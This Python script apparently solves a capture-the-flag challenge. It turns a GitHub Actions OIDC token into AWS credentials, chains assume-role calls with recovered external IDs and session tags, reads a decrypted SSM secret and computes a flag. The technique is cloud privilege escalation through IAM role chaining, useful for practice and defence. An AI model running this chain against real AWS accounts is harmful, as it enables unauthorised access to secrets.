#!/usr/bin/env python3
import hashlib
import hmac
import json
import os
import subprocess
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


# Constants recovered from public evidence and IAM role conditions.
ACCOUNT = "125746528491"
REGION = "ap-northeast-2"

A = "5be464357414"
B = "ami-0efca712577c4c937"
C = "bdeeb30544829362"
DOMAIN = "metricforge.swua.kr"

ENTRY_ROLE_ARN = f"arn:aws:iam::{ACCOUNT}:role/metricforge-entry-b8358a07fc"
BROKER_ROLE_ARN = f"arn:aws:iam::{ACCOUNT}:role/metricforge-broker-9d7a0ac7cc"
FINAL_ROLE_ARN = f"arn:aws:iam::{ACCOUNT}:role/metricforge-final-329005447e"

SOURCE_IDENTITY = "git-30b28c539ebd"
BROKER_EXTERNAL_ID = "mf-broker-bdeeb30544829362"
FINAL_EXTERNAL_ID = "01c4cc693cad98d62dbba067"
PARAMETER_NAME = "/metricforge/recovery/final-seed"


def mint_oidc_token() -> str:
    request = urllib.request.Request(
        os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=sts.amazonaws.com",
        headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        return json.load(response)["value"]


def assume_entry_role(token: str) -> dict:
    body = urllib.parse.urlencode(
        {
            "Action": "AssumeRoleWithWebIdentity",
            "Version": "2011-06-15",
            "RoleArn": ENTRY_ROLE_ARN,
            "RoleSessionName": "metricforge-final-stage",
            "WebIdentityToken": token,
            "DurationSeconds": "3600",
        }
    ).encode()
    request = urllib.request.Request("https://sts.amazonaws.com/", data=body)
    with urllib.request.urlopen(request, timeout=30) as response:
        root = ET.fromstring(response.read())
    namespace = {"s": "https://sts.amazonaws.com/doc/2011-06-15/"}
    credentials = root.find(".//s:Credentials", namespace)
    if credentials is None:
        raise RuntimeError("entry_credentials_missing")
    return {
        "AccessKeyId": credentials.findtext("s:AccessKeyId", namespaces=namespace),
        "SecretAccessKey": credentials.findtext("s:SecretAccessKey", namespaces=namespace),
        "SessionToken": credentials.findtext("s:SessionToken", namespaces=namespace),
    }


def credential_env(credentials: dict) -> dict:
    env = os.environ.copy()
    env.update(
        {
            "AWS_ACCESS_KEY_ID": credentials["AccessKeyId"],
            "AWS_SECRET_ACCESS_KEY": credentials["SecretAccessKey"],
            "AWS_SESSION_TOKEN": credentials["SessionToken"],
            "AWS_DEFAULT_REGION": REGION,
            "AWS_REGION": REGION,
            "AWS_EC2_METADATA_DISABLED": "true",
            "AWS_PAGER": "",
        }
    )
    return env


def aws(env: dict, args: list[str]) -> dict:
    proc = subprocess.run(
        ["aws", *args],
        env=env,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=60,
    )
    if proc.returncode:
        return {
            "ok": False,
            "returncode": proc.returncode,
            "stderr": proc.stderr[-2000:],
            "stdout": proc.stdout[-2000:],
        }
    return {"ok": True, "value": json.loads(proc.stdout) if proc.stdout.strip() else None}


def require_ok(label: str, result: dict) -> dict:
    if not result.get("ok"):
        raise RuntimeError(f"{label}_failed: {json.dumps(result, sort_keys=True)}")
    return result["value"]


def main() -> None:
    token = mint_oidc_token()
    entry_credentials = assume_entry_role(token)
    entry_env = credential_env(entry_credentials)

    broker = require_ok(
        "assume_broker",
        aws(
            entry_env,
            [
                "sts",
                "assume-role",
                "--role-arn",
                BROKER_ROLE_ARN,
                "--role-session-name",
                "recover-30b28c53",
                "--external-id",
                BROKER_EXTERNAL_ID,
                "--source-identity",
                SOURCE_IDENTITY,
                "--tags",
                f"Key=AmiId,Value={B}",
                f"Key=Attestation,Value={C}",
                "--transitive-tag-keys",
                "AmiId",
                "Attestation",
                "--output",
                "json",
            ],
        ),
    )
    broker_env = credential_env(broker["Credentials"])

    final = require_ok(
        "assume_final",
        aws(
            broker_env,
            [
                "sts",
                "assume-role",
                "--role-arn",
                FINAL_ROLE_ARN,
                "--role-session-name",
                "final-77c4c937",
                "--external-id",
                FINAL_EXTERNAL_ID,
                "--source-identity",
                SOURCE_IDENTITY,
                "--tags",
                f"Key=AmiId,Value={B}",
                f"Key=Attestation,Value={C}",
                "--transitive-tag-keys",
                "AmiId",
                "Attestation",
                "--output",
                "json",
            ],
        ),
    )
    final_env = credential_env(final["Credentials"])

    parameter = require_ok(
        "get_final_seed",
        aws(
            final_env,
            [
                "ssm",
                "get-parameter",
                "--name",
                PARAMETER_NAME,
                "--with-decryption",
                "--output",
                "json",
            ],
        ),
    )
    seed = parameter["Parameter"]["Value"]
    message = f"{A}|{B}|{C}|{DOMAIN}".encode()
    d_value = hmac.new(seed.encode(), message, hashlib.sha256).hexdigest()[:16]
    flag_hash = hashlib.sha256(f"{A}_{B}_{C}_{d_value}".encode()).hexdigest()

    print(
        json.dumps(
            {
                "ok": True,
                "A": A,
                "B": B,
                "C": C,
                "D": d_value,
                "flag": f"SCA{{{flag_hash}}}",
                "seed_sha256": hashlib.sha256(seed.encode()).hexdigest(),
            },
            indent=2,
            sort_keys=True,
        )
    )


if __name__ == "__main__":
    main()
